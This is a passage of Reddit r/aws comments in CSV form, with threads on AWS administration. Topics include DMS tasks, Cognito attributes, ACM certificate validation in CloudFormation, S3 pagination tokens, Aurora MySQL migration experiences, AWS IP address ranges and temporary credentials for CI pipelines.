Also, make sure you have amazon provided dns enabled on your VPCs. That’s required for interface endpoints to properly resolve to the endpoint address instead of the normal public endpoint.",3.0
g7fos30,j3z9zs,"There should be an option in DMS to stop individual replication tasks.

If you select the replication task, the option should be in the Actions pulldown.",1.0
g7fpq70,j3z9zs,I checked its not there. The only options are to modify or delete.,1.0
g7h4vf6,j3z9zs,"If there's no option to delete and you \*can\* choose modify or delete, then the task seems like it isn't running.",2.0
g7kxzos,j3z9zs,Is there a way to take a backup of this task and then delete? Is the DMS actually just a simple config that states the target and endpoint state? I have shutdown the instances but still I am thinking if deleting this would break something other than the DMS job itself?,1.0
g7lxyyx,j3z9zs,"No, it’ll be fine. The config is all accessible via the api, just query your jobs and save the api response. Everything you need to remake it will be in there.",1.0
g7favs7,j3vqxp,If it were my problem to solve I'd start with uploading the SVG using the cli or the console to determine if you can actually access the object.,2.0
g7hlgew,j3yjkg,"Some options from the top of my head. 

1. Setup usage plans + API keys on apigw in account B and then in HTTP  integration of apigw  in account A make sure you set headers to send the API key. And enable API key Auth on account B apigw. 

2. Setup custom lambda authorizer on apigw in account B. You can then authorize based on any http request attributes coming from apigw in account a. 

3. If you really want to hide you apigw in account B from the Internet then you can setup private apigw inside vpc in account B, and then use PrivateLink VPC Integration with NLB   on your account A apigw.  You will also need to have VPC between accounts A and B peered. 

https://aws.amazon.com/blogs/compute/introducing-amazon-api-gateway-private-endpoints/

Option 3 is very messy but I believe the only way to achieve account level restriction.",2.0
g7gh9vh,j3yjkg,"I don't know if you have to do it this way or not, but I think you can just have API GW(A) call lambdas in the other accounts.",1.0
g7gmz1z,j3yjkg,"yes, I tried that and was able to set a cross account policy and it works fine, but since some target endpoints wont be lambdas, we would like to make all integrations on GW A of type HTTP",1.0
g7h5lgx,j3y1x4,X-Ray does server and client APM.,1.0
g8hjnll,j3y1x4,"It feels like it kinda maybe can, but they dont provide a JS SDK (just node) to do this? I guess they have the clientside JS SDK in general, but I am at the understanding there's much to be implemented by us.

Conversely App Insight is drop and go.",1.0
g7i1l2n,j3y1x4,"No. AWS has XRay for tracing but no browsert-side solution for RUM (Real-User Monitoring). 

With XRay you get Support for API GW, AppSync and other Services but callers to your ""entrypoint"" are Always displayed as ""Client"" in the service map. 

We use XRay and a custom API GW that receives browser telemetry events from the frontend and then pushes the Data to CloudWatch and/or KinesisFirehose with S3 Output for Analytics.",1.0
g8hjsgz,j3y1x4,"This is basically what I arrived at. I'd love to be wrong. Thanks man.

Also, who honestly downvoted my OP. lmao redddit",1.0
g7f97g8,j3xu2i,"Yes. As long as you enable cognito authentication on the api gateway endpoint, api gateway checks the token for you",3.0
g7g40r4,j3xu2i,"Thanks. I'm not sure how I got on the wrong track with that one. It would have been a huge waste of resources.

Thinking it through, there would be no way of sneaking a forged JWT through to the Lambda.",1.0
g7hvmj2,j3xu2i,"Nope, that's the beauty/simplicity of it. Set and forget! :)",1.0
g7hxsri,j3xu2i,"""Set and forget"" is perhaps not the best mantra for security. 

""Trust but verify"" is more apt here.

Add the code to verify the JWT. Its minimal work and best practice to verify your JWTs where they are used.",1.0
g7u93ej,j3xu2i,"But if you have 50 lambda functions on a single SAM template, all behind the same Authorizer, wouldn't verifying it require duplicating the code 40 times? If you're verifying it, how is that trusting?",1.0
g7gujv4,j3xpjn,"Suggest you log a support ticket to confirm, you want to ensure it’s been updated.",2.0
g7lcken,j3xpjn,"According to support, was patched August 27th.   Just weird they don't post these things publically or at least inside the support section",2.0
g7gusma,j3xpjn,Word to Big Bird,1.0
g7lvlz9,j3xpjn,[deleted],2.0
g7ozd7i,j3xpjn,"Thanks, this is definitely good to know and what I was hoping the support person could provide.

The Windows 2012 R2 patch for CVE-2020-1472 was released August 11th and rated critical so it seems it should have been applied by August 16th.  That being said, I see the disclaimer *""AWS makes* ***every effort*** *to test and deploy the patch within five days""* so perhaps in this case they needed extra time.",1.0
g7ezucu,j3x16d,Ditch the HTTPS credentials and use the [git-remote-codecommit](https://docs.aws.amazon.com/codecommit/latest/userguide/setting-up-git-remote-codecommit.html) with your IAM session.,2.0
g7fvfb2,j3x16d,So git-remote-codecommit simply extends git to use your IAM session instead of needing a seperate set of credentials?,2.0
g7fvjle,j3x16d,Yep,1.0
g7f4j2m,j3x16d,"I came up with github.com/cmsd2/rotator
But using iam as per the sibling comment might be a better way to go if you can",1.0
g7hzt17,j3ui41,What are you using for notifications? CloudWatch and SNS?,1.0
g7s0buf,j3ui41,Yes Cloudwatch and SNS topics.,1.0
g7i1qrh,j3ui41,"Use 

- InsuffienctDataActions property for Alarms when No metrics exists (e.g. request count metric Missing)
- OKActions for the Switch to OK state
- AlarmActions for the Switch to Alarm state 

on your Alarm. That way you can Control the notifications",1.0
g7s3wda,j3ui41,"I have only setup alarms using the GUI, is there a guide on how to do this?",1.0
g7eyibd,j3wq9u,"You can set custom attribute data, but not in the AWS console. You have to do it through the API or from the command line. Here's what that CLI command to `aws` looks like:

`aws cognito-idp admin-update-user-attributes --user-pool-id my-user-pool --username` [`""blah@example.com`](mailto:""mfox@customdatacentre.com)`"" --cli-input-json file://./input.json`

And here is what `input.json` might look like:

`{`

  `""UserAttributes"": [{`

`""Name"": ""custom:likes"",`

`""Value"": ""beer,cars,video games""`

  `},`

  `{`

`""Name"": ""custom:personalitytype"",`

`""Value"": ""boring""`

  `}]`

`}`",3.0
g7ew1mb,j3wluv,"You can use the path part to make permission grants simpler later.

For example, if you want to set a policy that allows everyone in group ""Devs"" to be able to assume a set of roles which then only have access to Dev resources, you could build the roles with a path of ""/dev/"".

You'd then apply a policy to the group which allows sts:AssumeRole on ""arn:aws:iam::ACCOUNT:role/dev/*"", which means you don't have to update the policy every time you provision a new role for devs to use.",3.0
g7eukh8,j3wfm3,"it depends on how much money you want to spend, is this a hobby project? Then sure, lightsail with all components on one instance is great and cheap!  Is this for your company where people will rely on it and it has high uptime requirements?  Then you will likely at the very least want to go multi instance behind an ALB, potentially splitting the backend from the frontend, etc.  


TLDR comes down to what your needs are, if you are asking then lightsail is likely fine",2.0
g7euvx9,j3wfm3,Yeah it's a side project that maybe in the future I might scale but for now is relatively small with a relatively small database too (and I heard that then you can easily migrate to EC2 in case I need an extra server for the database right?),1.0
g7ev9dm,j3wfm3,"Yeah, adding an ec2 would be pretty easy - you would need to handle migrating your database data though",2.0
g83w34y,j3w0ws,"I've been through this software and have found absolutely nothing to do that exact thing. AWS CloudWatch would be where to do this most likely, but there are no options to setup automation with AppStream. AppStream itself is very hard to find info on without paying for support, and even then who knows.... I wish we didn't choose to use this for our school district. There is a 10 user limit on the amount of instances allowed per engine type. We are using streaming.graphics.xlarge for almost all of our fleets and we can only have 10 students be able to get on at one time between ALL of the fleets we made with that streaming.graphics.xlarge engine. I would advise finding other alternative solutions to avoid the mess we jumped into and are still in.

Anyone else, feel free to add solutions they've come up with though I'm curious as well.

&amp;#x200B;

Edit 1: Clarified more on AWS CloudWatch

Edit 2: Added ""Anyone else, feel free to add solutions they've come up with though I'm curious as well.""",1.0
g84id3q,j3w0ws,"You can request limit increases, I had mine upped to 300 instances.",1.0
g85j57b,j3w0ws,"Indeed, I’ve done this and am waiting on approval, but I wanted the OP to understand that AppStream can be very time consuming and still not meet expectations. I like the concept, but it feels incomplete.",1.0
g85q7nx,j3w0ws,"Would I find annoying is if I want multiple images in a stack/fleet I can’t do that, I have to create a second Saml app in gsuite for the second group of programs. What I would really like is to be able to show all the programs and then based on the programs launch a higher powered instance or a lower powered instance. I know it’s nitpicking. Overall it’s saved me quite a bit of headache having our CAD in graphic design programs being able to run on chrome books.",1.0
g7lfby8,j3vcsg,Ask this in r/sysadmin since this isn't really an AWS specific issue. But make sure the SQL Server service account is running with domain privileges.,1.0
g7feac1,j3tonj,"It worked for me. Auto added the ACM validation records to my hosted zone. It has to be public of course. Is the hosted zone owned by the account where you are deploying the stack?

You will also want to put the DomainName (stuff.my domain.com) in the SubjectAlternativeNames as well or some systems won’t trust it anymore.",2.0
g7ebmbj,j3tonj,Have to do domain validation options for alternative names as well i think. Ran into this issue as well. Check the console for the proper values,1.0
g7efakh,j3tonj,Works for me; but this means that the resource needs human intervention to proceed. Is that correct?,1.0
g7j4011,j3tonj,If you set up the domainvalidation option for the main and all alternatives it soll go through automatically. Used that about 2 weeks ago for the first time. Your domain name in the validation options should be the exact one you are using for your cert though not the underlying root Domain,1.0
g7kaq58,j3tonj,"Ok, let me get this one straight. Doing this:
```
  MyCertificate:
    Type: AWS::CertificateManager::Certificate
    Properties:
      DomainName: ""stuff.mydomain.com""
      SubjectAlternativeNames:
        - ""morestuff.mydomain.com""
      ValidationMethod: DNS
      DomainValidationOptions:
        - HostedZoneId: XXXXXXXXXXXXXXXXXXXXX
          DomainName: stuff.mydomain.com
        - HostedZoneId: XXXXXXXXXXXXXXXXXXXXX
          DomainName: morestuff.mydomain.com
```
would activate my new cert automatically by putting the DNS records in the given route53 zone?",1.0
g7mz630,j3tonj,"If I remember correctly this should be exactly right. It’s definitely possible, don’t have the code in front of me Right now but I think this is ho I did it",1.0
g7f8udf,j3tonj,"Yes, you have to click a box to validate the domain with CF, if it is a R53 hosted domain.

Manual process as far as I know. Good thing is, you only need to do it once for the top level domain, all other subdomains are automatically approved because the domain has been validated (iirc).",0.0
g7ggtps,j3tonj,"Thanks everyone for all the answers, it's clear to me now.  
However, I still don't really understand why would the AWS devs implement it - but leave it with the burden of having to do a manual step. I mean - I just don't understand what's the usecase for this API - there's a ton of lambdas on github that do the same thing but in an automated way.",1.0
g7ihea6,j3tonj,"DomainValidationOptions is a list of DomainValidationOption!

Thus you have to put two of it in, and the DomainName properties must match those in your certificate request. Then CFn will create the records for you.",1.0
g7ecjad,j3tdvg,"Bucket policies are the standard for cross account access. Glue Data Catalog now supports cross account access so you can house it in the data lake account and use it as your Hive metastore in your EMR account.

Depending on user numbers, look closely at the EMR support for IAM principals, which will likely make your life easier.

(Currently working on exactly this use case, so will keep an eye on replies to see if I've missed anything else)",1.0
g7j5yo6,j3tdvg,"Emr has roles that are applied to master and worker nodes. Assuming nodes only the ones that need access, you give that role access to the bucket via bucket access policy.

Further, you can lock that access to a VPC to have some extra control.",1.0
g7e3vi2,j3ssqy,"Those scripts can be combined to build more sophisticated combinations: EKS + ERC, VPC + EC2, etc.

All suggestions for improvements are welcome!",5.0
g7ebt57,j3ssqy,Great stuff! Thanks!,2.0
g7ecto0,j3ssqy,You're welcome!,1.0
g7edt57,j3ssqy,Why delete &amp; re-create the ECR repo every time you want to push a new image?,2.0
g7effxa,j3ssqy,"Just to test the ECR creation in itself: those scripts are some kind of unit tests for all AWS services to make sure that we can still get them to work. In a normal situation, you would create your registry only once and keep it",5.0
g7f3tef,j3ssqy,"Also, if this is a test you'd want to delete the ECR repo to save some money!",2.0
g7f5296,j3ssqy,"As well, yes!",1.0
g7g69b6,j3ssqy,"This is interesting, thanks for sharing!

I will say that as it stands now I couldn’t use this where I work, because it requires an IAM User Credentials flow (which means long-lived credentials instead of expiring ones).

I’m not sure if it’s possible with Github Actions, but if there was a way to have the agent assume an IAM role and get temporary credentials via STS, that would mean less long-lived credentials floating around!",2.0
g7gb8ay,j3ssqy,"We do something similar to this, where we actually have something else getting the temporary credentials, then pushing the temporary creds to a place they can be picked up by the CI/CD job doing the AWS build.

We don't use github actions/the stack that OP is using, but you can probably boot strap it in a similar way.

Death to non-temporary credentials!",1.0
g7gkjso,j3ssqy,Self hosted runner on a tiny ec2? Attach a IAM role to it and go from there,1.0
g7hhvnp,j3ssqy,"I checked the possibility to use STS via AWS CLI: it seems quite possible accordinng to [https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/index.html](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/index.html)

So, I will try to extend my use cases with STS. I'll post back here when done.",1.0
g7hq79p,j3ssqy,Oh hey this wasn’t a feature request but your bias for action here is admirable!,1.0
g7iaxkp,j3ssqy,"Yes, Please will check further update on it. Thanks",1.0
g7e7kzw,j3ssqy,!save,1.0
g7eczs8,j3ssqy,Thanks for the wholesome award! Didier,0.0
g7eskla,j3ssqy,no problem. do you do consultancy?,1.0
g7etrtv,j3ssqy,"Please, mail me via Reddit to understand better what you need. Didier",1.0
g7f1nwx,j3ssqy,"This saves me a handful of hours, i needed to use github actions to deploy an ec2 instance next week. I appreciate the post, thank you",1.0
g7fc7ha,j3ssqy,"So, i pushed it to Reddit just on time ! ;-)",2.0
g7k2xdk,j3ssqy,How to use saml2aws in GitHub actions,1.0
g7rqij0,j3ssqy,"Thank you for sharing this with us, much appreciated!",1.0
g7smipl,j3ssqy,You're very welcome!,1.0
g7ec8lg,j3r7o7,"Let me start out by saying that my answer is based upon the results I've encountered and not on anything I've read in their documentation.

I believe your scenario will work with one caveat.  The results are in alphabetical order including the full path to the object.  The token is merely the last item in that particular result set.  I'm assuming when you ask for the next 1,000 objects, it just starts at the one after the token alphabetically.  The one thing I don't know is if the item identified in the token doesn't exist, will it fail.  My gut tells me it won't but I have no proof.",1.0
g7ei6jd,j3r7o7,"Thanks! 
In my case it won't delete anything else except files that came from listObjects request.",1.0
g7ehb7j,j3r7o7,"Ok, I did a mini test to check this out myself - might have missed out some cases/scenarios here but hope this helps. (note: everything below was done via AWS Python SDK, i.e. boto3)


1. Loop through 1 to 1010, to create 0 byte files on S3 x1010 times with object names = 0001.txt up to 1010.txt.

2. Using the ListObjectsV2 method, list the first 1000 objects (0001.txt up to 1000.txt) and keep the NextContinuationToken - confirm I have listed 1000 keys.

3. Using the NextContinuationToken from step 2, list the remaining objects (1001.txt up to 1010.txt) - confirm I have listed 10 keys.

4. Repeat step 2.

5. Delete a few objects that were already listed in step 4 (e.g. 0050.txt, 0011.txt, etc.). Make sure you still have more than 1000 objects remaining. I deleted 0050.txt.

6. Using the NextContinuationToken from step 4, list the remaining objects. HERE: My ListObjectsV2 response included all 10 keys (1001.txt up to 1010.txt) - the same keys listed in step 3. Hooray!!



Hence in the above scenario, my NextContinuationToken token was NOT invalidated. In fact, it worked as expected and listed the remaining keys - as if I had never deleted any objects from the first 1000 keys to begin with.


Something I haven't considered, is if it still works the same if I delete all the 1000 objects that were first listed. But I would assume it behaves just as described above.
:)",0.0
g7ehw44,j3r7o7,"Thank you for the reply and for the effort! 
Personally i've tested this only locally using localstack and it worked as you described as well, but i didn't want to rely on my results only. 
Again, much appreciated!",1.0
g7e27c9,j3q3nr,"Could you expand a bit more on which types of resources you need shared? The first thing that comes to mind is Resource Access Manager (RAM) to create a group of resources to be shared with other accounts. If you want your resources added to it automatically once their tag is applied, that's doable using a scheduled Lambda on a short timer.

If your resources aren't all RAM-compatible (the list of resource types RAM supports is fairly short), we'll need more info to help out.",4.0
g7depr2,j3opqz,"The main gotcha isn't really a gotcha. The more weirdly you are using MySQL, the more problems you'll have going Aurora. That is, if you're pulling any clever weird stunts or using rare features then you'll want to be super careful in checking these are supported.

More generally, whenever you switch to a compatible or emulated alternative to some system, there's a risk of existing code working correctly by accident i.e., code might be broken and out of spec but happens to work OK because it doesn't go down a specific execution path. Or the original system fails to validate input properly, and allows your syntax errors to just glide through and runs it anyway; a compatible system might enforce checks more zealously.",11.0
g7dgkk4,j3opqz,Got any good examples that we should be on the look out for?,2.0
g7e3gn6,j3opqz,"In Postgres Aurora, WHERE NOT EXISTS queries were being run as ""WHERE EXISTS"":

https://www.theregister.com/2020/09/16/aws_aurora_postgresql_versions_disappeared/",7.0
g7estim,j3opqz,Oh lord that's pretty bad,2.0
g7e3mcz,j3opqz,"We had to abandon our transition to Aurora and use MySQL 8 RDS instead because our database makes heavy use of descending indexes, which MySQL 5.6/5.7 do not support.",6.0
g7dzpws,j3opqz,"One caveat we run into is that on Aurora you have your database kept in persistent auto-scaling storage, but temporary storage is local to a computing instance and depends on its class. So if your ALTER statement requires lots of temporary space to rebuild table/index, it may fail because of the insufficient local storage.

https://aws.amazon.com/premiumsupport/knowledge-center/aurora-mysql-local-storage/",5.0
g7h095l,j3opqz,I’ve been using gh-ost with great results at scale. Only issue I’ve run into is a table with a couple of blob columns couldn’t keep up with the binlog.,1.0
g7dp73x,j3opqz,"We have had zero issues to be fair. The only disadvantages would be if you needed to use the `SUPER` mysql command, as that is blocked. There are other restrictions but other than that it's been really valuable.

Yes, it is more expensive however the additional management features, in my opinion, are worth it, especially the auto scaling and the ability to spin up a new replica within a minute or two (we are using 15TB of data so that isn't straightforward outside of Aurora).

We migrated from EC2 to RDS Aurora so can't comment on RDS Mysql however no real issues.",3.0
g7dwuai,j3opqz,Bear in mind that all your aurora instances under the same cluster will be in the same security group. You can't control read / write splitting with firewall rules as a result.,3.0
g7h1lai,j3opqz,"Been using MySQL Aurora at scale with Rails for about four years. Reader instances have been a life saver. Before Aurora, read only instances didn’t always keep up via binlog replication. It was a nightmare. 

16k max connection count has become a potential issue recently. I’ve started looking into RDS proxy. 

Have an issue with connection pools sometimes getting into a bad state after failover. Sometimes have to recycle our Rails app after failover. Haven’t quite traced down that issue. 

It’s not cheap. About 1/3rd of our RDS costs are for IO.  But on the flip side, I pretty much manage our whole setup by myself as only a part of my job.",3.0
g7lxlqm,j3opqz,"I've been 99% super impressed with MySQL on Aurora on workloads that are not tiny and will need to scale. It costs more, but there are so many fewer gotchas (no worries about slaves getting out of date, snapshots causing issues, having to worry about disk expansions causing downtime, scaling readers, etc.) that I would't want to work somewhere where I had to worry about all those details.

Fast DDL, even though it's still in lab mode, is awesome.

We did recently have an issue when we upgraded from r5.12xlarge to r5.16xlarge... we're still investigating why, but the same workload produced huge slowdowns. It might be related to the formula for \`table\_open\_cache\` not scaling to bigger instances appropriately. That experience was very disappointing, but it doesn't dissuade me from using Aurora, just owning the reality that without a real DBA we will find issues here and there that are challenging.",3.0
g7e4qol,j3opqz,"Slightly different situation, we've migrated 50+ Oracle RDS to Aurora MySQL.  That meant rewriting some of our code to work with the changes of SQL between the two.

Oracle is an amazing DB, we were just using about 15% of its capabilities and paying a hefty price to do so.

No issues at all in three years. We've been nothing but impressed by Aurora.",2.0
g7ez2d6,j3opqz,Your bar was pretty low 😂,2.0
g7dplvg,j3opqz,"We have migrated large app days after it first launched and hit few minor issues with some edge case queries. At was all fixed within week.
No issues since than and we are running it hapilly for years.",1.0
g7e89kc,j3opqz,"I ran into a few issues going from on-premises MySQL to Aurora, mostly due to a connection limitation that I cannot for the life of me remember what it was. I ended up going through an EC2 instance, which increased the maintenance window for the migration, but was not a show stopper. 

Beyond that it has worked well for our use case.",1.0
g7e8etu,j3opqz,"We ran a large Rails 2.x app and later a Rails 4.2 app on AWS Aurora for several years and have had no issues, it's been great.",1.0
g7xmq43,j3opqz,We lost all 3 of our clusters of our Aurora Postgres yesterday on US-West-2.  Our Aurora Mysql clusters were unaffected.   According to the ticket it seems like it was full region outage as it mentions the whole region was degraded.    We got hit at 2AM and AWS didn't push a region status alert till 8:40AM.  It took 10 hours to resolve which is way beyond the 4 nines advertised on the service.,1.0
g7fm81g,j3opqz,https://reddit.com/r/aws/comments/iuojz9/yikes_aws_aurora_postgresql_versions_vanish_from/,-2.0
g7er6r2,j3opqz,"Here is all you need to hear about Aurora.

[https://www.reddit.com/r/aws/comments/bv70k8/aurora\_postgres\_disastrous\_experience/](https://www.reddit.com/r/aws/comments/bv70k8/aurora_postgres_disastrous_experience/) 

Please also note that with regular RDS you do not pay for I/O. With Aurora, you will pay for all I/O! Be ready to double your RDS bill just because of the I/O cost. BTW I'm not referring to provisioned I/O but all I/O activity on your DB. Aurora is way more EXPENSIVE than regular RDS. Also, it does NOT support MySQL 8.0+.",-3.0
g7dsozv,j3onn9,"If the bucket enforces encryption that could be the issue, ive had issues getting beanstalk to upload to s3 when aes256 is enabled",1.0
g7dsve7,j3onn9,Is there any way to solve the issue?(newbie in aws stuff),1.0
g7dt6ju,j3onn9,"Check if the bucket policy or bucket properties has encryption enabled 

https://docs.aws.amazon.com/AmazonS3/latest/user-guide/default-bucket-encryption.html

Example of a bucket policy
https://aws.amazon.com/premiumsupport/knowledge-center/s3-bucket-store-kms-encrypted-objects/

If the data isn't important you can test turning off encryption to see if you can upload",1.0
g7e1wb2,j3onn9,The encryption is already disabled,1.0
g7drsis,j3nue4,The concept/capability you're referring to is privileged access management and there's a ton of vendor solutions out there (e.g. CyberArk) you can use although probably not implemented in the exact way you're describing. You can roll your own custom solution in AWS but that may prove difficult (better solution would be a native AWS capability).,6.0
g7e6l0r,j3nue4,"You're either going to have to use a third-party or build out some of your own tooling. Fortunately a few weeks ago they FINALLY added API/CFN support for SSO so this is now a lot more possible than it was.

An idea I'm riffing on at the moment is building out some CloudFormation templates to manage the assignment, then exposing it to the users using Service Catalog. WaitCondition in the template will roll the stack back after a timeout.

Still theoretical at the moment, though.",4.0
g7eijo3,j3nue4,We’ve also been waiting on SSO API’s (although they still feel a bit limited but something is better than nothing) and was hoping to do something similar to Azure’s PIM. The service catalog idea is interesting. I guess you could use CloudWatch events for notifications,3.0
g7dl97z,j3nue4,"No ready made solution, but you can use the [AWS SSO API CreateAccountAssignment](https://docs.aws.amazon.com/singlesignon/latest/APIReference/API_CreateAccountAssignment.html) to assign a user to a privileged permission set and remove it after a given time",4.0
g7dsw7f,j3nue4,We use a seperate admin account that is SSO + MFA integrated. Day to day work is completely seperate to admin. Costs nothing and is easy to implement.,2.0
g7e8qz0,j3nue4,My team built a just in time identity tool for AWS. Holds entitlements and when requested creates the roles and does some magic to present the console to the user. It doesn’t use AWS SSO though.,1.0
g7eizsx,j3nue4,We use AWS organisations/SSO with our IDP being Azure AD. We then have a set of breaking glass roles that can be assumed by a small number of users specific to each set of accounts. We then use CloudWatch events for notification into our alert/ticking system when one of these roles is used. Fairly simple but it works for what we need and provides enough of an audit,1.0
g7dn3do,j3nue4,"NB AWS SSO is nothing to do with assuming roles in AWS and IAM.

It is a standalone SSO product that you can then use to assume roles etc in IAM.

So, I think, if you had a short duration priv in azure, auth to SSO and then assume a role, until your SSO session times out, you will have those elevated privs and be able to assume that role. SSO may allow a different lifetime than azure did. And if you had a session and bumped yourself, you'd have to wait for sso to time the session out.

Saml has some tricky timeouts about quick checks and full reauthentication and stuff. It might work as you expect, it might not.


What you probably want is federated auth from IAM to Azure without AWS SSO. (AWSSSO seems like an unnecessary step in almost all scenarios to me. It allows to use saml to a provider and provide saml to clients. Well why not just connect saml direct from the provider to the client????). 

However you will still get single sign on features with the saml link just not via AWS SSO. But IAM will always go back to azure when you change roles, not to some intermediate step that may not respect Azure's new state.

It's really badly named solution and causes no end of confusion.

"" I want to connect to AWS with SSO, therefore i need AWS SSO""

""Wrong, you need IAM federated authentication. That does SSO.""",0.0
g7dkepd,j3n1fo,"Well you don't have enough money to pay someone to do it, so probably you should take time to learn the skills by doing tutorials 

Then even if you don't make millions this time, at least you'll have valuable skills",2.0
g7dkwcn,j3n1fo,thanks for advice🙏 very appreciated i have to do it by myself but i want to make sure that my tech stack is well enough to do 😂,1.0
g7dmhvi,j3n1fo,"Have a look at AWS Amplify, it cuts a lot of the heavy lifting for you",2.0
g7dxu8y,j3n1fo,"wow really , i would look at that function thank you so much 🙏🙏",1.0
g7gjke9,j3n1fo,Check out UltimateWB - it makes building your website a lot faster and easier.,1.0
g7dtvnp,j3my4j,"You could host the front end in S3 with Cloudfront (or without) which sends queries to API Gateway where one or more lambda processes receives the request and takes action (authentication, validation, processing).

You can connect to a Postgres database in RDS or EC2, depends on your setup.

I can’t see any major problems with what your trying to do but you’ll need to spend a bit of time on architecture. Also lambda has to complete in 15 minutes, only you will know if this is an issue for your workload.

Personally I’m a big fan of Serverless but you do need to consider that there’s going to need to be some changes to support the architecture, sometimes those changes don’t add up cost wise.",2.0
g7hatz9,j3my4j,"Yes.  You can easily convert your Node app to run in Lambda by just adding three or four lines of code. 

https://github.com/awslabs/aws-serverless-express

Your front end assets will go in S3. You can host a website directly in S3. The JS calls your Node API.",1.0
g7d3djr,j3muke,Check for incomplete multipart uploads. You can clear them with the CLI/SDK or set up a lifecycle policy to automatically delete/cancel them.,4.0
g7d7pqb,j3muke,"THX, setting up a new rule for that",1.0
g7d0hem,j3mg1e,"I’m pretty sure Glacier access is distinctly different than S3.  If you don’t grant an IAM user access to glacier, or outright deny access to Glacier, they won’t be able to modify items in Glacier. Further reading below but it should be easy enough to test.

https://docs.aws.amazon.com/amazonglacier/latest/dev/access-control-identity-based.html",2.0
g7ctvb3,j3luvy,"The number of IP addresses they have is in the millions.

https://docs.aws.amazon.com/general/latest/gr/aws-ip-ranges.html",17.0
g7cvx2h,j3luvy,I did the math using the dumped list.  They have 50M IPs assigned to EC2 and another 2.4M assigned to other services.,7.0
g7dl4ip,j3luvy,"They have plenty IP addresses, the publish it via a json file, per service and per region, 

&amp;#x200B;

Here is the list per region: 

region ap-northeast-2, ips: 1469376

region eu-west-3, ips: 804908

region us-west-1, ips: 2793318

region us-west-2, ips: 17259984

region ap-southeast-2, ips: 3374588

region GLOBAL, ips: 3437824

region eu-west-1, ips: 10939463

region us-east-2, ips: 6342216

region ap-southeast-1, ips: 3488609

region eu-west-2, ips: 2520013

region ap-east-1, ips: 544818

region ap-south-1, ips: 2129312

region ap-northeast-1, ips: 6373258

region eu-central-1, ips: 4371290

region us-east-1, ips: 32690552

region sa-east-1, ips: 1531001

region eu-south-1, ips: 410517

region af-south-1, ips: 278748

region us-gov-west-1, ips: 670668

region cn-northwest-1, ips: 522456

region eu-north-1, ips: 674040

region me-south-1, ips: 411312

region ca-central-1, ips: 1594500

region ap-northeast-3, ips: 280128

region cn-north-1, ips: 614360

region ap-southeast-3, ips: 271408

region us-gov-east-1, ips: 278324

Total IP address: 106,076,991.",7.0
g7e35vb,j3luvy,They bought the entire 3.0.0.0/8 Class A range from GE.,6.0
g7epfpb,j3luvy,"Close. They bought 3.0.0.0/9 and 3.128.0.0/9

ARIN still owns 3.0.0.0/8",2.0
g7e52uz,j3luvy,There's 16M IPs,1.0
g7e6w1w,j3luvy,IPv4 addresses sell for about $20/each right now.,2.0
g7e6p32,j3luvy,"They bought a /10 from a company I worked with.  I started with them about 4 years after the sale.

That company never stopped using those addresses internally and continued to route the full /8, and I could never make them understand why they couldn’t reliably access AWS services or third party saas products hosted on AWS.  It was like willful ignorance that their internal routing could impact external routing.",1.0
g7e6y25,j3luvy,Hey that sounds alot like GE when I worked there and exactly this same thing happened!,2.0
g7dpgt6,j3luvy,While AWS are running millions of virtual machines not ten thousands not all of them require public IPs addresses. You use public facing services that have IPs but the vast majority of your platform will be using private IP. They or any other big public cloud vendor won’t be running out of IPs soon :),5.0
g7e90xg,j3luvy,"Can confirm.

We are running about 60 instances across 3 VPCs and have something like 6 public IPs that are used only by us.",3.0
g7glrsf,j3luvy,I should have thought of that. I've only used publicly faced devices so far.,1.0
g7cyzvi,j3luvy,"Of all the things that can go wrong in cloud, IP exhaustion is far down the list.",-4.0
g7cg6xb,j3jz9s,"I don't know if this is the best approach, but you can go to your RDS console and create a ""read-replica"". Once the read-replica is ready, you can ""[promote](https://aws.amazon.com/blogs/aws/amazon-rds-for-mysql-promote-read-replica/)"" it to a new independent RDS instance that you can then connect to from any EB environment.",4.0
g7chvg1,j3jz9s,"Yeah in general I don't attach the DB to my EB environments, for the reason you pointed out.",2.0
g7e1m2k,j3jz9s,[This] (https://aws.amazon.com/premiumsupport/knowledge-center/decouple-rds-from-beanstalk/) article will walk you through the steps that you can take to do it.,1.0
g7euvts,j3jz9s,Thanks!,1.0
g7cfagn,j3i20m,[https://awesome-aws-workshops.com](https://awesome-aws-workshops.com),2.0
g7cgfx9,j3i20m,Thank you!,1.0
g7cl7kl,j3i20m,"Your best bet is to create some goals for yourself that challenge you to orchestrate lots of services together.

* create blog and host it 5 different ways using 5 different services.
* find a non-profit and migrate their site to AWS
* etc",2.0
g7cxhdh,j3i20m,I'd avoid #2. liability,7.0
g7cmg2l,j3i20m,"I'd go this - personal projects to get something running are always good learning experiences.

I don't think people should pick up work for a nonprofit unless they plan on supporting them ongoing though. Without in house AWS knowledge, lifting and shifting a site off the host they're used to is just more work for them.",1.0
g7cdy24,j3i20m,"[https://aws.amazon.com/training/self-paced-labs/](https://aws.amazon.com/training/self-paced-labs/)

[https://www.cbtnuggets.com/](https://www.cbtnuggets.com/)",1.0
g7cgdsg,j3i20m,Thank you! I will check out cbtnuggets. Is it worth it to buy a subscription to the amazon qwiklabs?,1.0
g7e7mgj,j3i20m,"Also have a look at the official study guides for Architecting on AWS, Developing on AWS etc. They include hands-on exercises at the end of each chapter.",1.0
g7ch6n5,j3jmby,"Do you have an in-addr.arpa zone in Route53, if note reverse lookups won’t work?",3.0
g7ch8nw,j3jmby,"Support request with AWS, seriously they have to do something on their end.  Unless its changed recently, pretty sure that is your answer.",3.0
g7cl4xx,j3jmby,"Yup I just found the form and filled it out, gotta wait now. For anyone else the form is located here:

https://console.aws.amazon.com/support/contacts?#/rdns-limits

Even if you are not planning on using E-Mail you need to still fill out the same form. (E-Mail is not the only thing requiring reverse DNS but it is by far the most popular reason).",3.0
g7jw4n8,j3jmby,Just create a hosted zone for rDNS,1.0
g7cg3ck,j3hub3,Looks like it wants an aurora serverless instance. Sounds like you have a mysql instance.,2.0
g7donuz,j3hub3,"Thanks Coffee.

I had managed to get this working as you suggested. I added a serverless instance. I did in fact have this but the region I was in was not coming up in the \`cluster location\` until a patch was released yesterday.

So I added back in the serverless and am now getting:

 `Fetching Aurora Serverless cluster...BadRequestException: Access denied for user 'hutber'@'`[`10.1.14.4`](https://10.1.14.4)`' (using password: YES)`

Which is just as frustrating :p",2.0
g7eblhm,j3hub3,That’s annoying. Glad it works now!,1.0
g7c7j9v,j3hjvi,"Additionally, why tf Windows Server for Moodle?",4.0
g7c5xtk,j3hjvi,"* Check your security groups and NACLs

